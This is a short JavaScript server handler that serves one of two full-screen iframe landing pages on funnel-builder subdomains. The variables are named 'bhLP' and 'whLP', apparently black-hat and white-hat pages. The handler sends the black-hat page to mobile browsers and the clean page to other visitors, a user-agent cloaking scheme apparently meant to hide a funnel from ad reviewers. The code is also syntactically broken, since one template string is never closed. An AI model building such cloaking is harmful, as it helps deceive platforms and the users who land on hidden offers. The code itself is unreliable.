import isRedirectEnabled from './config';

export default function handler(req, res) {

    var bhLP = `
    <html>
        <body>
            <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://jzudipwaq.myfunnelish.com/tt-shp-rw"></iframe>
        </body>
    </html>
    `;
    
    var whLP = `
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fullscreen iFrame</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden; /* Prevent scrolling */
        }

        iframe {
            display: block;
            position: absolute;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <iframe src="https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939"></iframe>
</body>
</html>

    if (!isRedirectEnabled) {
        bhLP = whLP;
    }
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

    if (isMobileDevice) {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(bhLP);
    }
    else { 
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(whLP);
    }
    
    res.end();
  }
